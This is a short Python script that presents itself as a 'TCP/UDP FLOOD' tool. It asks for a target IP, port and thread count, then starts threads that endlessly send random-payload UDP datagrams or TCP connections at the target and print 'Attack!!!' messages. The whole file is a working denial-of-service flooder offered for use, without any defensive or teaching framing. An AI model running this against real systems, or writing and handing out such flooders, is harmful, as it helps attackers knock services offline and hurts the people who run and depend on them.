import signal
import socket
import random
import threading
import sys
import os
import struct
import time
import codecs
red='\033[31m'
green='\033[32m'

os.system("clear")

print("\033[33m\033[33m")


print("\033[32m TCP/UDP FLOOD \033[32m")
ip = str(input(" Ip: => "))
port = int(input(" Port: => "))
choice = str(input(" UDP(y/n): => "))
times = int(input(" Packets : => "))
threads = int(input(" Threads: => "))
def run():
	data = random._urandom(1024)
	i = random.choice(("[*]","[+]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" ΣXCITΣD 13 Attack!!!")
		except:
			print("[!] Down!!!")

def run2():
	data = random._urandom(16)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" ΣXCITΣD 13 Attack!!!")
		except:
			s.close()
			print("[*] Down!!!")

for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()
